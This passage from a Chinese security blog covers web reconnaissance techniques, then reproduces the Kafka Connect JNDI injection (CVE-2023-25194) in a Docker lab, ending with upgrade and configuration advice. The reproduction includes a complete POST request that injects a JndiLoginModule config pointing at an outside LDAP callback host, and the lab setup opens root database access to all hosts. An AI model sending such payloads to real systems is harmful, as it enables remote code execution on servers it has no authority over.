id="5、子域名信息收集"><a href="#5、子域名信息收集" class="headerlink" title="5、子域名信息收集"></a>5、子域名信息收集</h1><p>​子域名可以让我们发现目标在互联网上更多的资产与服务,扩大攻击面,更易找到薄弱点。</p><h4 id="subDomainsBrute"><a href="#subDomainsBrute" class="headerlink" title="subDomainsBrute"></a><a href="https://github.com/lijiejie/subdomainsbrute">subDomainsBrute</a></h4><p>Subdomainsbrutei可以高并发DNS暴力枚举,对子域名进行爆破,用小字典递归发现三到五级域名。<br>工具地址</p><p><img src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.assets/image-20211021134901470.png" alt="image-20211021134901470"></p><h4 id="搜索引擎-site"><a href="#搜索引擎-site" class="headerlink" title="搜索引擎       site:"></a>搜索引擎       site:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:1000phone.net</span><br></pre></td></tr></table></figure><h3 id="第三方聚合应用"><a href="#第三方聚合应用" class="headerlink" title="第三方聚合应用"></a>第三方聚合应用</h3><h5 id="第三方服务汇聚了大量的DNS数据集-可以检索某个给定域名的子域名信息。"><a href="#第三方服务汇聚了大量的DNS数据集-可以检索某个给定域名的子域名信息。" class="headerlink" title="第三方服务汇聚了大量的DNS数据集,可以检索某个给定域名的子域名信息。"></a>第三方服务汇聚了大量的DNS数据集,可以检索某个给定域名的子域名信息。</h5><p>DNSdumpster<a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></p><p>virusTotal<a href="https://www.virustotal.com/gui/home/search">https://www.virustotal.com/gui/home/search</a></p><p>Netcraft<a href="https://searchdns.netcraft.com/">https://searchdns.netcraft.com/</a></p><h3 id="证书透明度介绍"><a href="#证书透明度介绍" class="headerlink" title="证书透明度介绍"></a>证书透明度介绍</h3><p>​授权机构(CA)是一个受信任的第三方组织,负责发布和管理SSL&#x2F;TLS证书,全球有数百个受信任的CA,他们中任何一个都有权利为你的域名颁发有效的SSL证书。 </p><p>​证书透明度(C)是为了防止证书授权机构(CA)或者其他恶意人员伪造服务器证书而诞生的一个项目。</p><p>​CT会要求CA将数字证书(SSL&#x2F;TLS证书)公开并发布将颁发记录同步到日志服务器中。而日志服务器则会供给用户一个查找某域名颁发的所有数字证书途径。</p><h4 id="数字证书中包含子域名相关的信息"><a href="#数字证书中包含子域名相关的信息" class="headerlink" title="数字证书中包含子域名相关的信息"></a>数字证书中包含子域名相关的信息</h4><p> <a href="https://crt.sh/">https://crt.sh</a></p><p><a href="https://search.censys.io/">https://search.censys.io/</a></p><h2 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h2><p>​网页安全政策( Content Security Policy,缩写CSP)。CSP的实质就是<strong>白名单</strong>制度,开发者明确告诉客 户端,哪些外部资源可以加载和执行,等同于提供白名单。</p><p>​我们可以査看HTTP的Content-security-Policy?字段来搜集子域名信息。</p><p><img src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.assets/image-20211025145507671.png" alt="image-20211025145507671"></p><h3 id="DNS区域传送漏洞"><a href="#DNS区域传送漏洞" class="headerlink" title="DNS区域传送漏洞"></a>DNS区域传送漏洞</h3><p>​一般DNS服务器会存在冗余备份,而主备之间同步域数据库的操作,就是DNS区域传送( DNS zone transfer)。主服务器对来请求的备用服务器未作<strong>访可控制</strong>,<strong>验证身份</strong>就做出相应故而出现这个漏洞。 </p><h4 id="Nslookupi命令检测"><a href="#Nslookupi命令检测" class="headerlink" title="Nslookupi命令检测"></a><strong>Nslookupi命令检测</strong></h4><p>(1) nslookup -type&#x3D;nsxx.y.Cn#査询解析此域名的dns服务器<br>(2) nslookup #进入交互<br>(3) server dns. xxx. yyy.cn#指定dns服务器<br>(4) Is xxx. yyy.cn#列出域信息</p><h4 id="Dig命令检测"><a href="#Dig命令检测" class="headerlink" title="Dig命令检测"></a><strong>Dig命令检测</strong></h4><p>(1) dig NS xxx. yyy.cn#查询解析该域名的DNS服务器<br>(2)<a href="mailto:&#x64;&#x69;&#103;&#x40;&#x64;&#x6e;&#x73;&#x2e;&#120;&#x78;&#x78;&#46;&#121;&#x79;&#121;&#x2e;&#99;&#110;">&#x64;&#x69;&#103;&#x40;&#x64;&#x6e;&#x73;&#x2e;&#120;&#x78;&#x78;&#46;&#121;&#x79;&#121;&#x2e;&#99;&#110;</a> axfrxxx.y.cn#@指定域名服务器;axfr为域传送指令;x.edu.cn表示 要査询的域名</p><h4 id="子域名挖掘机"><a href="#子域名挖掘机" class="headerlink" title="子域名挖掘机"></a>子域名挖掘机</h4><h4 id="sublist3R"><a href="#sublist3R" class="headerlink" title="sublist3R"></a><a href="https://github.com/aboul3la/Sublist3r">sublist3R</a></h4><p>​Sublist3r使用许多搜索引擎(例如 Google, Yahoo,Bing, Baidui和Ask)枚举子域。使用 Netcraft,Virustotal, Threatcrowd, Dnsdumpsteri和 Reversedns枚举子域。 subbrute与 Sublist3r集成在一起, 以增加使用具有改进的单词表的 bruteforce查找更多子域的可能性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sublist3r.py -d 1000phone.net</span><br></pre></td></tr></table></figure><h4 id="OneForAll"><a href="#OneForAll" class="headerlink" title="OneForAll"></a><a href="https://github.com/shmilylty/OneForAll">OneForAll</a></h4><p><img src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.assets/image-20211025170933364.png" alt="image-20211025170933364"></p><h2 id="服务器信息收集"><a href="#服务器信息收集" class="headerlink" title="服务器信息收集"></a>服务器信息收集</h2><h3 id="获得服务器真实IP"><a href="#获得服务器真实IP" class="headerlink" title="获得服务器真实IP"></a>获得服务器真实IP</h3><h4 id="CDN-即内容分发网络。"><a href="#CDN-即内容分发网络。" class="headerlink" title="CDN 即内容分发网络。"></a>CDN 即内容分发网络。</h4><p>​CDN是将媒体资源,动静态图片( Flash),HTML,CSS,JS等等内容缓存到距离你更近的节点,从而让 用户进行共享资源,<strong>实现缩减站点间的响应时间</strong>等等需求,提高用户访问的响应速度和成功率。解决因分 布、带宽、服务器性能带来的访问延迟问题,适用于站点加速、点播、直播等场景。</p><p><img src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.assets/image-20211026100617769.png" alt="image-20211026100617769"></p><h4 id="目标IP信息收集"><a href="#目标IP信息收集" class="headerlink" title="目标IP信息收集"></a>目标IP信息收集</h4><p>​有些站可能会上CDN，那么我们就<strong>无法获得真实的IP地址</strong>，拿到的地址是CDN节点的地址</p><h4 id="判断是否存在CDN"><a href="#判断是否存在CDN" class="headerlink" title="判断是否存在CDN"></a>判断是否存在CDN</h4><p>​使用站长工具的ping测试,会从许多节点去ping目标服务器,如果是不司P地址可能上了CDN。注意对IP日属 地进行解析。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://asm.ca.com/en/ping.php/ </span><br><span class="line">http://ping.chinaz.com </span><br><span class="line">https://ping.aizhancom </span><br><span class="line">https://www.ipip.net/ip.html </span><br><span class="line">https://tools.ipip.net/ping.php</span><br></pre></td></tr></table></figure><h5 id="在线平台"><a href="#在线平台" class="headerlink" title="在线平台"></a>在线平台</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.cdnplanet.com/tools/cdnfinder/ </span><br></pre></td></tr></table></figure><h5 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/3xp10it/xcdn</span><br></pre></td></tr></table></figure><h3 id="子城名获得真实IP"><a href="#子城名获得真实IP" class="headerlink" title="子城名获得真实IP"></a>子城名获得真实IP</h3><p>​大多数情况下,企业在互联网上的网站资产较多,不会对所有站点都使用CDN进行加速。那么我们可以从子<br>域名入手,获取真实IP。</p><h4 id="利用站点功能主动发起请求"><a href="#利用站点功能主动发起请求" class="headerlink" title="利用站点功能主动发起请求"></a>利用站点功能主动发起请求</h4><p>​网站中的注册或找回密码功能中会发送邮件验证,或者RSS订阅、邮件订阅等这些功能就会让服务器主动发 起请求,我们可以获得对方服务器的IP地址。但大多数时候获取的是邮件服务器地址。  </p><h3 id="利用DNS记录"><a href="#利用DNS记录" class="headerlink" title="利用DNS记录"></a>利用DNS记录</h3><p>查询域名与IP的历史记录,可能会发现使用CDN之前的目标P地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">https://dnsdb.i0/zh-cn/ </span><br><span class="line"></span><br><span class="line">https://x.threatbook.cn/</span><br><span class="line">http://toolbarnetcraft.com/sitereport?url=</span><br><span class="line"></span><br><span class="line">http://viewdns.info/ http://www.17ce.com/ </span><br><span class="line"></span><br><span class="line">https://community.riskiq.com/ </span><br><span class="line"></span><br><span class="line">http://www.crimeflare.com/cfssl.html</span><br></pre></td></tr></table></figure><h4 id="利用冷门的DNS请求"><a href="#利用冷门的DNS请求" class="headerlink" title="利用冷门的DNS请求"></a>利用冷门的DNS请求</h4><p>​某些CDN对国外的覆盖面不广,那么可以利用这种特性进行探测。使用国外的代理或DNS解析来查看IP。</p><h1 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h1><h3 id="nmap的使用"><a href="#nmap的使用" class="headerlink" title="nmap的使用"></a>nmap的使用</h3><p>​Nmap可以检测目标主机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操作系统与设 备类型等信息。它是网络管理员必用的软件之ー,用以评估网络系统安全。</p><p><strong>nmap -O  来判断操作系统</strong></p><p><strong>Windows中不区分大小     Linux中大小敏感</strong></p><h3 id="主机服务信息"><a href="#主机服务信息" class="headerlink" title="主机服务信息"></a>主机服务信息</h3><p>nmap -sV</p><h4 id="web应用架构探测"><a href="#web应用架构探测" class="headerlink" title="web应用架构探测"></a>web应用架构探测</h4><p>​对于具有Web应用的服务器,我们需要深入探测Web应用架构,包括Web中间件、服务端脚本语言、数据 库、Web应用开发框架、Web应用指纹等等。</p><img src="img/信息收集.assets/image-20211026142935027.png" alt="image-20211026142935027" style="zoom:50%;" /><img src="img/信息收集.assets/image-20211026143008059.png" alt="image-20211026143008059" style="zoom: 25%;" /><p>​页面报错信息中有时候会泄露服务器信息。</p><img src="img/信息收集.assets/image-20211026143049890.png" alt="image-20211026143049890" style="zoom:50%;" /><h3 id="WEB应用敏感信息"><a href="#WEB应用敏感信息" class="headerlink" title="WEB应用敏感信息"></a>WEB应用敏感信息</h3><p>​寻找Web应用的敏感目录、敏感文件、源码泄露。</p><img src="img/信息收集.assets/image-20211026145359095.png" alt="image-20211026145359095" style="zoom: 25%;" /><h3 id="wfuzz"><a href="#wfuzz" class="headerlink" title="wfuzz"></a>wfuzz</h3><p>​wfuzzi可以用在做参数的模糊测试,也可以用来做Web目录扫描等操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w Dir.txt http://XXX.COM/FUZZ</span><br></pre></td></tr></table></figure><h3 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/fuzzdb-project/fuzzdb </span><br><span class="line">https://github.com/danielmiessler/SecLists </span><br><span class="line">https://qithub.com/bl4de/dictionaries/</span><br><span class="line">https://github.com/TheKingOfDuck/fuzzDicts</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CVE-2023-25194】Apache_Kafka_Connect_JNDI注入漏洞 复现</title>
      <link href="/2023/03/12/Apache_Kafka_Connect_JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20(CVE-2023-25194)%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/03/12/Apache_Kafka_Connect_JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20(CVE-2023-25194)%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache-Kafka-Connect-远程代码执⾏漏洞"><a href="#Apache-Kafka-Connect-远程代码执⾏漏洞" class="headerlink" title="Apache Kafka Connect 远程代码执⾏漏洞"></a>Apache Kafka Connect 远程代码执⾏漏洞</h1><h2 id="1-漏洞受影响版本"><a href="#1-漏洞受影响版本" class="headerlink" title="1.漏洞受影响版本"></a>1.漏洞受影响版本</h2><p>2.3.0 &lt;&#x3D; Apache Kafka &lt;&#x3D; 3.3.2</p><h2 id="2-漏洞描述"><a href="#2-漏洞描述" class="headerlink" title="2.漏洞描述"></a>2.漏洞描述</h2><p>Apache Kafka是美国阿帕奇（Apache）基⾦会的⼀套开源的分布式流媒体平台。该平台能够获取实时数据，⽤于构建对数据流的变化进⾏实时反应的应⽤程序。在Apache Kafka Connect 2.3.0到3.3.2的版本中，攻击者可以使⽤基于SASL JAAS配置和SASL协议的任意Kafka客户端，在对Kafka Connect Worker进⾏创建或者修改连接器时，通过构造特殊的配置，进⾏JNDI注⼊，是否能RCE需要看⽬标主机的jdk版本以及是否存在可⽤的利⽤链。连接器（Connector）是用于连接其他数据源的模块，从 2.3.0 版本开始，为了增加连接器的可重用性和可扩展性，用户可修改 kafka 客户端的 SASL JAAS（授权服务） 配置或 SASL-based 安全协议。3.0.0 版本之后，Kafka Connect 标准化了 Kafka 与其他数据系统的集成，用户可方便地对 Kafka Connect 集群中的连接器属性进行配置。默认会在8083端口开启HTTP REST API服务，可对连接器（Connector）的配置进行操作。</p><p><img src="/img/CVE-2023-25194.assets/image-20230216113025491.png" alt="image-20230216113025491"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /connectors 返回一个活动的connect列表</span><br><span class="line">POST /connectors 创建一个新的connect；请求体是一个JSON对象包含一个名称字段和连接器配置参数</span><br><span class="line">GET /connectors/&#123;name&#125; 获取有关特定连接器的信息</span><br><span class="line">GET /connectors/&#123;name&#125;/config 获得特定连接器的配置参数</span><br><span class="line">PUT /connectors/&#123;name&#125;/config 更新特定连接器的配置参数</span><br></pre></td></tr></table></figure><p>连接器中的 Kafka 客户端sasl.jaas.config属性值设置为 com.sun.security.auth.module.JndiLoginModule（通过 producer.override.sasl.jaas.config,consumer.override.sasl.jaas.config或 admin.override.sasl.jaas.config属性进行配置)时，如果连接器连接到攻击者可控的 LDAP 服务器时容易受到反序列化攻击。</p><h2 id="3-漏洞环境"><a href="#3-漏洞环境" class="headerlink" title="3.漏洞环境"></a>3.漏洞环境</h2><p>⽅式：Docker靶场 <a href="http://xxx:8083/connectors">http://XXX:8083/connectors</a></p><p>漏洞组件版本：wurstmeister&#x2F;kafka:2.7.0</p><p>其他组件：wurstmeister&#x2F;zook</p><p>通过docker-compos来进行搭建</p><p>安装docker-compose</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">配置阿里云Docker yum源</span><br><span class="line">[root@xingdian ~]# yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo安装Docker版本</span><br><span class="line">docker 加速</span><br><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://ak7e6zuh.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><p><img src="/img/img/CVE-2023-25194.assets/image-20230215230851795.png" alt="image-20230215230851795"></p><p>通过docker-compose.yaml进行安装容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">version: &#x27;3.7&#x27;</span><br><span class="line">services:</span><br><span class="line">  zookeeper:</span><br><span class="line">    image: wurstmeister/zookeeper</span><br><span class="line">    container_name: zk</span><br><span class="line">    platform: linux/amd64</span><br><span class="line">    ports:</span><br><span class="line">      - 2182:2181</span><br><span class="line"></span><br><span class="line">  kafka:</span><br><span class="line">    image: wurstmeister/kafka:2.13-2.7.0</span><br><span class="line">    container_name: kafka</span><br><span class="line">    platform: linux/amd64</span><br><span class="line">    ports:</span><br><span class="line">      - 9092:9092</span><br><span class="line">      - 8083:8083</span><br><span class="line">    environment:</span><br><span class="line">      KAFKA_BROKER_ID: 0</span><br><span class="line">      KAFKA_ADVERTISED_LISTENERS: PLAINTEXT://:9092</span><br><span class="line">      KAFKA_ZOOKEEPER_CONNECT: zookeeper:2181</span><br><span class="line">      KAFKA_LISTENERS: PLAINTEXT://0.0.0.0:9092</span><br><span class="line">    depends_on:</span><br><span class="line">      - zookeeper</span><br></pre></td></tr></table></figure><p>查看容器并复制文件到容器内</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp debezium-connector-mysql kafka:/opt/kafka/plugins</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Mysql连接器下载地址(注意对应的kafka版本):</span><br><span class="line">https://repo1.maven.org/maven2/io/debezium/debezium-connector-mysql/</span><br></pre></td></tr></table></figure><p><img src="/img/CVE-2023-25194.assets%5Cimage-20230216112202391.png" alt="image-20230216112202391">修改配置文件并打开8083端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi /opt/kafka/config/connect-distributed.properties</span><br><span class="line">取消注释#rest.port=8083</span><br><span class="line">在配置⽂件末尾追加</span><br><span class="line">plugin.path=/opt/kafka/plugins</span><br></pre></td></tr></table></figure><p><img src="/img/CVE-2023-25194.assets/image-20230216012405572-6515317.png" alt="image-20230216012405572"></p><p>重启 Worker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd opt/kafka</span><br><span class="line">bin/connect-distributed.sh -daemon config/connect-distributed.properties</span><br></pre></td></tr></table></figure><p><img src="/img/CVE-2023-25194.assets/image-20230215232100617-6515314.png" alt="image-20230215232100617"></p><p>通过浏览api 接口信息 <a href="http://ip:8083/connector-plugins">http://ip:8083/connector-plugins</a></p><p>如下图，则mysql连接器加载成功。<img src="/img/CVE-2023-25194.assets/image-20230216113135068.png" alt="image-20230216113135068"></p><p>安装mysql数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yum install mariadb-server.x86_64 -y   下载数据库</span><br><span class="line">systemctl start mariadb.service启动数据库</span><br><span class="line">ss -antupl |grep &quot;3306&quot;查看是否启动</span><br><span class="line">mysqladmin -u root password &quot;root&quot; 修改密码</span><br><span class="line">grant all on *.* to &#x27;root&#x27;@&#x27;%&#x27; identified by &quot;root&quot;;  对所有地址进行放行</span><br><span class="line">select host,user,password from mysql.user;   </span><br></pre></td></tr></table></figure><h2 id="4-漏洞复现"><a href="#4-漏洞复现" class="headerlink" title="4.漏洞复现"></a>4.漏洞复现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">POST /connectors HTTP/1.1</span><br><span class="line">Host: 192.168.232.130:8083</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 790</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;test133211&quot;,</span><br><span class="line">  &quot;config&quot;: &#123;</span><br><span class="line">    &quot;connector.class&quot;: &quot;io.debezium.connector.mysql.MySqlConnector&quot;,</span><br><span class="line">    &quot;tasks.max&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;database.hostname&quot;: &quot;192.168.232.130&quot;,</span><br><span class="line">    &quot;database.port&quot;: 3306,</span><br><span class="line">&quot;database.history.producer.sasl.jaas.config&quot;: &quot;com.sun.security.auth.module.JndiLoginModule required user.provider.url=\&quot;ldap://1122.5b39e81f.dns.1433.eu.org/ewwe\&quot; useFirstPass=\&quot;true\&quot; serviceName=\&quot;x\&quot; debug=\&quot;true\&quot; group.provider.url=\&quot;xxx\&quot;;&quot;,</span><br><span class="line">    &quot;database.user&quot;: &quot;root&quot;,</span><br><span class="line">&quot;database.history.producer.security.protocol&quot;: &quot;SASL_SSL&quot;,</span><br><span class="line">    &quot;database.password&quot;: &quot;root&quot;,</span><br><span class="line">    &quot;database.server.id&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;database.server.name&quot;: &quot;localhost&quot;,</span><br><span class="line">    &quot;database.history.kafka.bootstrap.servers&quot;: &quot;172.18.0.3:9092&quot;,</span><br><span class="line">    &quot;database.history.kafka.topic&quot;: &quot;dbhistory.config&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/CVE-2023-25194.assets/image-20230216012653971-6515302.png" alt="image-20230216012653971"></p><p>通过<a href="https://dig.pm/%E5%B9%B3%E5%8F%B0%E6%8E%A5%E6%94%B6">https://dig.pm/平台接收</a></p><p><img src="/img/CVE-2023-25194.assets/image-20230216012709739-6515297.png" alt="image-20230216012709739"></p><h2 id="5-漏洞建议："><a href="#5-漏洞建议：" class="headerlink" title="5.漏洞建议："></a>5.漏洞建议：</h2><p>​将您的Apache Kafka升级至 3.4.0版本及以上，从Apache Kafka 3.4.0开始，我们添加了一个系统属性(“-Dorg.apache.kafka.disallowed.login.modules”)来禁用SASL JAAS配置中有问题的登录模块使用。默认情况下“com.sun.security.auth.module.JndiLoginModule”在 Apache Kafka 3.4.0 中被禁用。我们建议 Kafka Connect 用户验证连接器配置并只允许受信任的 JNDI 配置。还要检查易受攻击版本的连接器依赖项，并升级其连接器、升级特定依赖项或删除连接器作为补救选项。 最后，除了利用“org.apache.kafka.disallowed.login.modules”系统属性外，Kafka Connect用户还可以实现自己的连接器客户端配置覆盖策略，该策略可以用来控制哪些Kafka客户端属性可以直接在连接器配置中覆盖，哪些不能。</p><h3 id="请描述Apache-Kafka无法升级的情况下，有几种方式可以保证"><a href="#请描述Apache-Kafka无法升级的情况下，有几种方式可以保证" class="headerlink" title="请描述Apache Kafka无法升级的情况下，有几种方式可以保证"></a>请描述Apache Kafka无法升级的情况下，有几种方式可以保证</h3><p>JNDI分全局配置和私有配置，具体配置详见下面：</p><h5 id="一、全局配置"><a href="#一、全局配置" class="headerlink" title="一、全局配置:"></a>一、全局配置:</h5><p>需要在项目的META-INF下面建立context.xml文件，在里面写上： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;Context&gt; </span><br><span class="line">  &lt;ResourceLink name=&quot;jdbc/test&quot; global=&quot;jdbc/test&quot; type=&quot;javax.sql.DataSource&quot;/&gt; </span><br><span class="line">&lt;/Context&gt; </span><br></pre></td></tr></table></figure><p>这样就可以在程序里面通过context.lookup(“java:comp&#x2F;env&#x2F;jdbc&#x2F;test”)进行访问了。 </p><h5 id="二、私有的JNDI有三种方式可以配置："><a href="#二、私有的JNDI有三种方式可以配置：" class="headerlink" title="二、私有的JNDI有三种方式可以配置："></a>二、私有的JNDI有三种方式可以配置：</h5><h6 id="1、可以直接在server-xml里面的节点下添加如下配置："><a href="#1、可以直接在server-xml里面的节点下添加如下配置：" class="headerlink" title="1、可以直接在server.xml里面的节点下添加如下配置："></a>1、可以直接在server.xml里面的<Host>节点下添加如下配置：</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;Context path=&quot;/test_tomcat6_jndi&quot;&gt; </span><br><span class="line">&lt;Resource name=&quot;jdbc/test&quot; </span><br><span class="line">   auth=&quot;Container&quot; </span><br><span class="line">       type=&quot;javax.sql.DataSource&quot; </span><br><span class="line">       driverClassName=&quot;com.mysql.jdbc.Driver&quot; </span><br><span class="line">       url=&quot;jdbc:mysql://127.0.0.1/test&quot; </span><br><span class="line">       username=&quot;root&quot; </span><br><span class="line">       password=&quot;root&quot; </span><br><span class="line">       maxActive=&quot;20&quot; </span><br><span class="line">       maxIdle=&quot;10&quot; </span><br><span class="line">       maxWait=&quot;-1&quot;/&gt; </span><br><span class="line">&lt;/Context&gt; </span><br></pre></td></tr></table></figure><p>这样就可以直接在程序中通过context.lookup(“java:comp&#x2F;env&#x2F;jdbc&#x2F;test”)访问了,需要注意的是path&#x3D;”&#x2F;test_tomcat6_jndi”，这个名字必须和你的项目名称相同，而且不能少了那个斜杠，而且你的项目是通过拷贝文件夹到webapps下面的方式进行的部署。 </p><h6 id="2、-也可以在conf-x2F-context-xml里面增加如下配置："><a href="#2、-也可以在conf-x2F-context-xml里面增加如下配置：" class="headerlink" title="2、 也可以在conf&#x2F;context.xml里面增加如下配置："></a>2、 也可以在conf&#x2F;context.xml里面增加如下配置：</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;Resource name=&quot;jdbc/test&quot; </span><br><span class="line">   auth=&quot;Container&quot; </span><br><span class="line">       type=&quot;javax.sql.DataSource&quot; </span><br><span class="line">       driverClassName=&quot;com.mysql.jdbc.Driver&quot; </span><br><span class="line">       url=&quot;jdbc:mysql://127.0.0.1/test&quot; </span><br><span class="line">       username=&quot;root&quot; </span><br><span class="line">       password=&quot;root&quot; </span><br><span class="line">       maxActive=&quot;20&quot; </span><br><span class="line">       maxIdle=&quot;10&quot; </span><br><span class="line">       maxWait=&quot;-1&quot;/&gt; </span><br></pre></td></tr></table></figure><p>这样就可以直接在程序中通过context.lookup(“java:comp&#x2F;env&#x2F;jdbc&#x2F;test”)访问了 </p><h6 id="3、还可以在项目的WebRoot下面的META-INF文件夹下面创建context-xml文件，再在context-xml文件里面写上"><a href="#3、还可以在项目的WebRoot下面的META-INF文件夹下面创建context-xml文件，再在context-xml文件里面写上" class="headerlink" 